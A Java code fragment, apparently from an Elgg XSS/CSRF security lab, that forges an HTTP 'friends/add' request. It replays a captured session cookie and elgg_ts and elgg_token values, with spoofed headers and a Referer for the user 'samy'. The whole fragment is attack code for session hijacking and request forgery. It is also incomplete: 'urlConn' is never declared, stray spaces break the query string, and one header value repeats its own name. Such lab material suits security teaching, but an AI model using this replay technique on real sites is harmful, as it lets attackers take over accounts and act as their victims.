//http://www.xsslabelgg.com/action/friends/add?friend=42&__elgg_ts=1510626149&__elgg_token=36e73a17f781a09faebd050a39c5f8b1

    InputStream responseIn = null;
    String requestDetails = "&__elgg_ts=1510626149 & __elgg_token = 36e73a17f781a09faebd050a39c5f8b1 ";
     // URL to be forged.
    URL url = new URL("http://www.xsslabelgg.com/action/friends/add?friend = 39 "+requestDetails);

//Host: www.xsslabelgg.com
      urlConn.addRequestProperty("Host", "www.xsslabelgg.com");
//User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0
      urlConn.addRequestProperty("User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
//Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      urlConn.addRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
//Accept-Language: en-US,en;q=0.5
      urlConn.addRequestProperty("Accept-Language", "Accept-Language: en-US,en;q=0.5");
//Accept-Encoding: gzip, deflate
      urlConn.addRequestProperty("Accept-Encoding", "gzip, deflate");
//Referer: http://www.xsslabelgg.com/profile/samy
      urlConn.addRequestProperty("Referer", "http://www.xsslabelgg.com/profile/samy");
//Cookie: Elgg=4eihjisbm0mvpjvjlmiclat5n3
      urlConn.addRequestProperty("Cookie", "Elgg=4eihjisbm0mvpjvjlmiclat5n3");
//Connection: keep-alive
      urlConn.addRequestProperty("Connection", "keep-alive");


